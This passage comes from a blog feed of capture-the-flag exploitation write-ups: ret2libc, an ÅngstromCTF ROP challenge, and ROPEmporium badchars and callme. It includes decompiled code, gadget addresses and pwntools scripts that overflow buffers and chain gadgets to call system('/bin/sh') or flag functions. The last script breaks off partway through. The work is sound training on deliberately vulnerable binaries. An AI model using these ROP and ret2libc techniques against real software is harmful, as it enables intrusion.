class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc.address = printf - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]                                        </span><br></pre></td></tr></table></figure><p>The printf variable is just the address of <code>printf</code>. With the baseaddress it’s possible to find the address of a system call like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system = p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])                                                  </span><br></pre></td></tr></table></figure><p>We can also search for the <code>/bin/sh</code> string:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin_sh = p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)))                                           </span><br></pre></td></tr></table></figure><p>Now we basically just have to do the payload.</p><h3 id="Exploiting-the-binary"><a href="#Exploiting-the-binary" class="headerlink" title="Exploiting the binary"></a>Exploiting the binary</h3><p>Our payload will be something like passing the padding, then we have to call the system with <code>/bin/sh</code> as the argument. This can be done with a <code>pop rdi</code> gadget. I first tried using this payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">address = io.recvline()</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&quot;i&quot;</span>*<span class="number">72</span></span><br><span class="line"></span><br><span class="line">printf = <span class="built_in">str</span>(address).split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">printf = printf[<span class="number">12</span>][:-<span class="number">1</span>]</span><br><span class="line">printf = <span class="built_in">int</span>(printf, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] printf: &quot;</span> + <span class="built_in">str</span>(printf))</span><br><span class="line"></span><br><span class="line">libc.address = printf - libc.symbols[<span class="string">&#x27;printf&#x27;</span>] </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] libc.address: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">pop_rdi = p64(<span class="number">0x00000000004005e3</span>)</span><br><span class="line"></span><br><span class="line">system = p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">bin_sh = p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = padding + pop_rdi + bin_sh + system</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>This didn’t work. It segfaulted at a <code>movaps</code> instruction. This is because the stack is not alligned, so we just have to make a return somewhere in the payload, like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">address = io.recvline()</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&quot;i&quot;</span>*<span class="number">72</span></span><br><span class="line"></span><br><span class="line">printf = <span class="built_in">str</span>(address).split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">printf = printf[<span class="number">12</span>][:-<span class="number">1</span>]</span><br><span class="line">printf = <span class="built_in">int</span>(printf, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] printf: &quot;</span> + <span class="built_in">str</span>(printf))</span><br><span class="line"></span><br><span class="line">libc.address = printf - libc.symbols[<span class="string">&#x27;printf&#x27;</span>] </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] libc.address: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">pop_rdi = p64(<span class="number">0x00000000004005e3</span>)</span><br><span class="line"></span><br><span class="line">ret = p64(<span class="number">0x000000000040041e</span>)</span><br><span class="line"></span><br><span class="line">system = p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">bin_sh = p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = padding + pop_rdi + bin_sh + ret + system</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>And this payload now worked. When running on remote, the libc had to be set like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br></pre></td></tr></table></figure><p>And that was my first ret2libc challenge.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ÅngstromCTF: really obnoxious problem</title>
      <link href="/2022/05/06/angstromctf/"/>
      <url>/2022/05/06/angstromctf/</url>
      
        <content type="html"><![CDATA[<h2 id="Writeup-for-the-pwn-challenge-“really-obnoxious-problem”-from-AngstromCTF"><a href="#Writeup-for-the-pwn-challenge-“really-obnoxious-problem”-from-AngstromCTF" class="headerlink" title="Writeup for the pwn challenge “really obnoxious problem” from ÅngstromCTF"></a>Writeup for the pwn challenge “really obnoxious problem” from ÅngstromCTF</h2><p>While doing some quick recon I found out that the file is a 64-bit ELF, not stripped. The only security enabled is NX, so we can’t execute any shellcode on the stack. </p><p>To figure out how the program works, I disassembled the file in Ida Pro. We have the <code>main</code> function, which calls a <code>vuln</code> function. We also have a <code>flag</code> function, which is never called. So we have to get the <code>vuln</code> function to return to the <code>flag</code> function. The <code>flag</code> function looks like this:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">flag</span><span class="params">(<span class="type">int</span> a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2[<span class="number">136</span>]; <span class="comment">// [rsp-90h] [rbp-90h] BYREF</span></span><br><span class="line">  FILE *v3; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x1337</span> &amp;&amp; !<span class="built_in">strncmp</span>(a2, <span class="string">&quot;bobby&quot;</span>, <span class="number">5uLL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error: missing flag.txt.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fgets(v2, <span class="number">128</span>, v3);</span><br><span class="line">    <span class="built_in">puts</span>(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So the <code>flag</code> function check if the first argument passed to the function is <code>0x1337</code> and it also checks if the second argument passed is a string containing <code>&quot;bobby&quot;</code>. If these two requirements are met, the program prints a flag. </p><p>The <code>vuln</code> function looks like this:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp-40h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%49s&quot;</span>, &amp;name);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Address: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(&amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>First the program askas for your name. This is a <code>scanf</code> and can’t be overflown. Next it asks for an address. Then the program returns <code>gets(&amp;v1)</code>. The program uses the <code>gets</code> function, which is vulnerable and should never be used. </p><p>I started debugging the file in gdb-pwndbg to find an overflow somewhere. When passing more than 72 bytes to the <code>gets</code> function we get a segmentation fault. </p><p>So 72 bytes is our padding. Cool. </p><p>If we pass 72 bytes and then the address of the flag function, we end up in the flag function. Debugging in gdb we can see that it compares <code>[rbp - 0x94]</code> with <code>0x1337</code>. But how do we set <code>[rbp - 0x94]</code>? To instructions above the compare instruction, the <code>edi</code> is mov’ed into <code>[rbp - 0x94]</code>. <code>edi</code> is the lower half bytes of <code>rdi</code>, so if we can put a value into <code>rdi</code> we can complete this compare. Luckily we have a <code>pop rdi; ret</code> gadget, so we can easily do this.</p><p>The next problem is a stringcompare. It compares our input with the string <code>bobby</code>. Here it uses the <code>rsi</code> register, because it is the second argument. So if we can overwrite the <code>rsi</code> register with <code>bobby</code> the stringcompare will go through and we get the flag. We just need a <code>pop rsi</code> gadget. But we only have a <code>pop rsi; pop r15; ret</code> gadget. We can still use this gadget to overwrite the <code>rsi</code> register and we can just fill some junk into the <code>r15</code> register. </p><h3 id="Exploiting-the-binary"><a href="#Exploiting-the-binary" class="headerlink" title="Exploiting the binary"></a>Exploiting the binary</h3><p>We can find our ropgadgets by using the ropper tool. As I wrote about above, we will have to pass 72 bytes and then the address of the <code>flag</code> function to get to the <code>flag</code> function. But first we need to set the correct values to the registers. So we can use the <code>pop rdi</code> gadget to pass <code>0x1337</code> to the <code>rdi</code> register. Then we can use the <code>pop rsi pop r15</code> to pass the string <code>bobby</code> to the <code>rsi</code> register, and we can just pass some junk to the <code>r15</code> register. At last we can call our <code>flag</code> function, and that should give us flag.</p><p>Exploit ended up like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">io.sendline(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&quot;i&quot;</span>*<span class="number">72</span></span><br><span class="line"></span><br><span class="line">flag = p64(<span class="number">0x0000000000401256</span>)</span><br><span class="line">pop_rdi = p64(<span class="number">0x00000000004013f3</span>)</span><br><span class="line">pop_rsi_pop_r15 = p64(<span class="number">0x00000000004013f1</span>)</span><br><span class="line">ret = p64(<span class="number">0x000000000040101a</span>)</span><br><span class="line">val = p64(<span class="number">0x1337</span>)</span><br><span class="line">val2 = p64(<span class="number">0x402004</span>)</span><br><span class="line">val3 = p64(<span class="number">0x1010</span>)</span><br><span class="line">thingies = <span class="string">b&quot;i&quot;</span>*<span class="number">100</span></span><br><span class="line"></span><br><span class="line">payload = padding + pop_rdi + val + ret + pop_rsi_pop_r15 + val2 + val + ret + flag</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ROPEmporium: badchars 64-bit</title>
      <link href="/2022/04/14/badchars/"/>
      <url>/2022/04/14/badchars/</url>
      
        <content type="html"><![CDATA[<h2 id="Writeup-for-badchars-from-ROPEmporium"><a href="#Writeup-for-badchars-from-ROPEmporium" class="headerlink" title="Writeup for badchars from ROPEmporium"></a>Writeup for badchars from ROPEmporium</h2><p>This challenge is the fifth challenge from ROPEmporium.com</p><p>It’s basically the same challenge as the previous, write4, but this time we get some chars that we are not allowed to use when setting the <code>&quot;flag.txt&quot;</code> string. This makes it painful. Let’s take a look at the binary by using <code>objdump -d badchars</code>. We get <code>usefulFunction</code>, <code>pwnme</code>, and <code>usefulGadgets</code>. </p><p>In Ida Pro they look like this:</p><p>The <code>pwnme</code> function:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// attributes: thunk</span></span><br><span class="line">__int64 __fastcall <span class="title function_">pwnme</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> pwnme(a1, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It still looks a bit weird because it’s called in a library, but it does the same as always.</p><p>The <code>usefulFunction</code> is also pretty much the same:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">usefulFunction</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> print_file(<span class="string">&quot;nonexistent&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It returns a <code>print_file</code> with the string <code>&quot;nonexistent&quot;</code>. We want this to be changed to <code>&quot;flag.txt&quot;</code>. We need somewhere to store this string. We can check the sections of the binary by using <code>readelf -s badchars</code>. This will show us that we have 10 bytes available in the .data section again. Perfect. </p><p>But we have a problem, which is the characters we can’t use. When running the file they are displayed like this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;</span><br></pre></td></tr></table></figure><p>So we have to change our string in some way. Let’s take a look at the <code>usefulGadgets</code> function:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400628 &lt;usefulGadgets&gt;:</span><br><span class="line">   0x0000000000400628 &lt;+0&gt;:xor    BYTE PTR [r15],r14b</span><br><span class="line">   0x000000000040062b &lt;+3&gt;:ret    </span><br><span class="line">   0x000000000040062c &lt;+4&gt;:add    BYTE PTR [r15],r14b</span><br><span class="line">   0x000000000040062f &lt;+7&gt;:ret    </span><br><span class="line">   0x0000000000400630 &lt;+8&gt;:sub    BYTE PTR [r15],r14b</span><br><span class="line">   0x0000000000400633 &lt;+11&gt;:ret    </span><br><span class="line">   0x0000000000400634 &lt;+12&gt;:mov    QWORD PTR [r13+0x0],r12</span><br><span class="line">   0x0000000000400638 &lt;+16&gt;:ret    </span><br><span class="line">   0x0000000000400639 &lt;+17&gt;:nop    DWORD PTR [rax+0x0]</span><br></pre></td></tr></table></figure><p>Two of the gadget are looking useful. The xor gadget and the mov gadget.</p><p>Okay, so we will need some more gadgets for this to work. We have some different pop gadgets. One that pops four registers like this: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br></pre></td></tr></table></figure><p>Then we have a gadget that pops rdi:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004006a3 : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>And we also have another pop gadget:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004006a0 : pop r14 ; pop r15 ; ret</span><br></pre></td></tr></table></figure><p>Now let’s go craft an exploit</p><h3 id="Exploiting-the-binary"><a href="#Exploiting-the-binary" class="headerlink" title="Exploiting the binary"></a>Exploiting the binary</h3><p>We can start by building an exploit like the one from the previous challenge. So we will use the address of the .data section to store our string. We can do this by using the gadget that pops the four registers and the we can pass our <code>&quot;flag.txt&quot;</code> string to R12, the address of the .data sections to R13 and some junk to R14 and R15. Then we can move the contents of R12 to the address that R13 points to with the move gadget. At last we can pop rdi with the .data section address to use as argument for the <code>usefulFunction</code> that prints a file. Let’s run it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to open file: fl\xeb\xeb\xebt\xebt</span><br></pre></td></tr></table></figure><p>Okay so it tried to open a file. The characters “a”, “g”, “.”, and “t” are replaced by “\xeb”. That is somewhat expected as these characters are the “bad” ones. Let’s do something about that. </p><p>We can xor the <code>&quot;flag.txt&quot;</code> string with something. If we xor with 2 and send the same payload we get this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to open file: dnce,vzv</span><br></pre></td></tr></table></figure><p>Now we have to xor the value of our sent string in some way. We can use the xor gadget. We can cook something up in python that does this for us:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">returnXor = <span class="string">b&quot;&quot;</span></span><br><span class="line">dataAddressOffset = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xorString:</span><br><span class="line">    returnXor += pop_r14_r15</span><br><span class="line">    returnXor += pack(xorValue)</span><br><span class="line">    returnXor += pack(dataAddress + dataAddressOffset)</span><br><span class="line">    returnXor += xor_r15_r14</span><br><span class="line">    dataAddressOffset += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>So for every character in <code>xorString</code> it pops <code>xorValue</code> into R14 and the address of the .data section plus an offset that increases for every byte into R15. Then it xors R14 and R15.</p><p>We change the payload so that it includes our <code>returnXor</code> string and try to run the program. We get this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to open file: flag.tzt</span><br></pre></td></tr></table></figure><p>This is weird. I bothered with this for a while. The problem is in the address of the .data section. We are storing our <code>&quot;flag.txt&quot;</code> string in the first 8 bytes of the .data section, which is 10 bytes. For some reason this affects the xor operation. The fix is to store the string in the last 8 bytes. So we increase the address with 2, and then we get our well deserved flag.</p><p>The exploit ended up a bit messy:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&quot;i&quot;</span>*<span class="number">40</span></span><br><span class="line">dataAddress = <span class="number">0x0000000000601030</span> </span><br><span class="line">ret = p64(<span class="number">0x00000000004004ee</span>)</span><br><span class="line">printAddress = p64(<span class="number">0x0000000000400620</span>)</span><br><span class="line">pop_rdi = p64(<span class="number">0x00000000004006a3</span>)</span><br><span class="line">mov_r13_r12 = p64(<span class="number">0x0000000000400634</span>)</span><br><span class="line">pop_r12_r13_r14_r15 = p64(<span class="number">0x000000000040069c</span>)</span><br><span class="line">pop_r14_r15 = p64(<span class="number">0x00000000004006a0</span>)</span><br><span class="line">xor_r15_r14 = p64(<span class="number">0x0000000000400628</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xorValue = <span class="number">2</span></span><br><span class="line">xorString = xor(<span class="string">&#x27;flag.txt&#x27;</span>, xorValue)</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">returnXor = <span class="string">b&quot;&quot;</span></span><br><span class="line">dataAddressOffset = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xorString:</span><br><span class="line">    returnXor += pop_r14_r15</span><br><span class="line">    returnXor += pack(xorValue)</span><br><span class="line">    returnXor += pack(dataAddress + dataAddressOffset)</span><br><span class="line">    returnXor += xor_r15_r14</span><br><span class="line">    dataAddressOffset += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(returnXor)</span><br><span class="line"></span><br><span class="line">payload = padding + pop_r12_r13_r14_r15 + flat(xorString) + p64(dataAddress) + p64(<span class="number">0x00</span>) + p64(<span class="number">0x00</span>) + mov_r13_r12 + returnXor</span><br><span class="line"></span><br><span class="line">payload += pop_rdi + p64(dataAddress) + printAddress </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>And yet again, this is only the exploit part, not the whole script.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ROPEmporium: callme 64-bit</title>
      <link href="/2022/04/12/callme/"/>
      <url>/2022/04/12/callme/</url>
      
        <content type="html"><![CDATA[<h2 id="Writeup-of-callme-from-ROPEmporium"><a href="#Writeup-of-callme-from-ROPEmporium" class="headerlink" title="Writeup of callme from ROPEmporium"></a>Writeup of callme from ROPEmporium</h2><p>This challenge is the third challenge from ROPEmporium.com</p><p>For this challenge the author gives us an explanation of how to complete it. This removes the need for a lot of reverse engineering. It says that we have to call the <code>callme_one()</code>, <code>callme_two()</code> and <code>callme_three()</code> functions in that order, and with the parameter <code>0xdeadbeef</code>, <code>0xcafebabe</code>, <code>0xd00df00d</code>. It would look something like <code>callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)</code>. Because we are doing the 64-bit version the arguments will have to be 8 bytes instead of 4 bytes, so it will be <code>0xdeadbeefdeadbeef</code>, <code>0xcafebabecafebabe</code>, <code>0xd00df00dd00df00d</code>.</p><p>Okay, now let’s take a look at the binary. It’s a 64-bit binary, with only NX enabled as security. Just like the first two files. We can use <code>objdump -d callme</code> to take a look at the functions of the binary. We have the <code>pwnme</code> function, and we also have the <code>usefulFunction</code>. This time we have another function too called <code>usefulGadgets</code>.</p><p>By disassembling the function in Ida Pro we get a better understanding of the functions.</p><p>The <code>pwnme</code> function looks like this:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hope you read the instructions...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It sets the buffer of our input as 32 bytes, but the read function reads 0x200 bytes this time. 0x200 bytes is 512 bytes in decimal. Our payload is gonna be a long one, so it makes sense that we get this big of an overflow. </p><p>The <code>usefulFunction</code> looks like this:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">usefulFunction</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  callme_three(<span class="number">4LL</span>, <span class="number">5LL</span>, <span class="number">6LL</span>);</span><br><span class="line">  callme_two(<span class="number">4LL</span>, <span class="number">5LL</span>, <span class="number">6LL</span>);</span><br><span class="line">  callme_one(<span class="number">4LL</span>, <span class="number">5LL</span>, <span class="number">6LL</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It just calls the three <code>callme</code> functions. This is where we are going to get their addresses from. </p><p>For the <code>usefulGadgets</code> function it doesn’t makes sense to look at it disassembled. In fact we can’t really se it disassembled. So let’s take a look at the assembly code: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040093c &lt;usefulGadgets&gt;:</span><br><span class="line">  40093c:5f                   pop    %rdi</span><br><span class="line">  40093d:5e                   pop    %rsi</span><br><span class="line">  40093e:5a                   pop    %rdx</span><br><span class="line">  40093f:c3                   ret</span><br></pre></td></tr></table></figure><p>The important thing here is that we get some useful gadgets, just like the function name states. </p><h3 id="Exploiting-the-binary"><a href="#Exploiting-the-binary" class="headerlink" title="Exploiting the binary"></a>Exploiting the binary</h3><p>We pass 32 bytes of junk to the <code>pwnme</code> function along with 8 more bytes to fill the base pointer. Then we have to call the <code>callme_one()</code> function with the three arguments. We will have to take a look at the calling conventions again. The first arguments is stored in RDI, the second is stored in RSI, and the third in RDX. Luckily the useful gadgets pops all of these three registers for us, so we can pass our input. </p><p>Okay, okay, this is starting to get a little confusing. Let’s clear it up. We pass 40 bytes of junk, then we pop the three registers, pass the arguments <code>0xdeadbeefdeadbeef</code>, <code>0xcafebabecafebabe</code>, <code>0xd00df00dd00df00d</code>, and then the <code>callme_one()</code> function. Then we pop the registers again and pass the arguments, call the <code>callme_two()</code> function. Then pop the three registers again, pass the arguments, call the <code>callme_three()</code>. And that should be it. Phew.</p><p>The payload, crafted in the pwntools library, ended up looking like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line"></span><br><span class="line">offset = asm(<span class="string">&quot;nop&quot;</span>) * <span class="number">40</span> <span class="comment">#b&quot;i&quot;*40</span></span><br><span class="line">ropgadget = p64(<span class="number">0x000000000040093c</span>) </span><br><span class="line">callme_three = p64(<span class="number">0x004006f0</span>)</span><br><span class="line">callme_two = p64(<span class="number">0x00400740</span>)</span><br><span class="line">callme_one = p64(<span class="number">0x00400720</span>)</span><br><span class="line">ret = p64(<span class="number">0x00000000004006be</span>)</span><br><span class="line"></span><br><span class="line">deadbeef = p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">cafebabe = p64(<span class="number">0xcafebabecafebabe</span>)</span><br><span class="line">d00df00d = p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line"></span><br><span 